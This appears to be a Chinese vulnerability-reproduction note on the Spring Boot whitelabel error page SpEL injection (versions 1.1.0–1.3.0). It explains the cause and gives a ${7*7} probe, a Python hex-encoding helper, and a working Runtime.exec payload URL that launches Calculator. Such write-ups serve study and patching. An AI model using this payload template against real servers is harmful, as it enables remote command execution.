<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Spring Boot whitelabel error page SpEL rce</h1><h2>一、漏洞简介</h2><h3>利用条件</h3><ul><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><h2>二、漏洞影响</h2><p>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</p><h2>三、复现过程</h2><h4><em>漏洞原理：</em></h4><ol class="pydocx-list-style-type-decimal"><li>spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中</li><li>此时 URL 中的参数值会用 parseStringValue 方法进行递归解析</li><li>其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><h3>漏洞复现</h3><h5>步骤一：找到一个正常传参处</h5><p>比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。</p><h5>步骤二：执行 SpEL 表达式</h5><p>输入 /article?id=${7*7} ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p>由字符串格式转换成 0x** java 字节形式，方便执行任意代码：</p><p># coding: utf-8<br /><br />result = ""<br />target = 'open -a Calculator'<br />for x in target:<br />    result += hex(ord(x)) + ","<br />print(result.rstrip(','))</p><p>执行 open -a Calculator 命令</p><p>${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}</p><p>正常访问：</p><p>http://www.0-sec.org:9091/article?id=66</p><p>执行 open -a Calculator 命令：</p><p>http://www.0-sec.org:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}</p></body></html>